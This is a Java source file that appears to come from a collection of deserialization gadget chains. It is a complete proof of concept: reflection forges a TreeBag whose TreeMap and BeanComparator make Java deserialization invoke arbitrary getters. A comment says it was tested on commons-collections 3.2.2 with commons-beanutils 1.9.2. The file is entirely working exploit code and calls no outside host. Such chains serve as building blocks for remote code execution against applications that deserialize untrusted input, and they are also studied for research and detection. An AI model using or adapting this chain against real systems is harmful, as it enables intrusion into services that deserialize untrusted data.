package com.xiinnn.readobject2getter;

import com.xiinnn.template.GetterClass;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.bag.TreeBag;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.TreeMap;

// TreeBagReadObject#readObject -> getter
// 实测：commons-collections#3.2.2 commons-beanutils#1.9.2
public class TreeBagReadObject2Getter {
    public static void main(String[] args) throws Exception{
        GetterClass getterClass = new GetterClass();

        BeanComparator<Object> comparator = new BeanComparator<>(null, String.CASE_INSENSITIVE_ORDER);
        setFieldValue(comparator, "property", "name");
        TreeBag treeBag = new TreeBag(comparator);

        TreeMap<Object,Object> m = new TreeMap<>();
        setFieldValue(m, "size", 2);
        setFieldValue(m, "modCount", 2);
        Class<?> nodeC = Class.forName("java.util.TreeMap$Entry");
        Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Class c = Class.forName("org.apache.commons.collections.bag.AbstractMapBag$MutableInteger");
        Constructor constructor = c.getDeclaredConstructor(int.class);
        constructor.setAccessible(true);
        Object MutableInteger = constructor.newInstance(1);

        Object node = nodeCons.newInstance(getterClass, MutableInteger, null);
        Object right = nodeCons.newInstance(getterClass, MutableInteger, node);

        setFieldValue(node, "right", right);
        setFieldValue(m, "root", node);
        setFieldValue(m, "comparator", comparator);
        setFieldValue(treeBag, "map", m);

        byte[] poc = serialize(treeBag);
        unserialize(poc);
    }
    public static void setFieldValue(Object obj, String field, Object val) throws Exception{
        try {
            Field dField = obj.getClass().getDeclaredField(field);
            dField.setAccessible(true);
            dField.set(obj, val);
        }catch (NoSuchFieldException e){
            Field f = obj.getClass().getSuperclass().getDeclaredField(field);
            f.setAccessible(true);
            f.set(obj, val);
        }
    }
    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }
    public static void unserialize(byte[] bytes) throws IOException, ClassNotFoundException {
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }
}
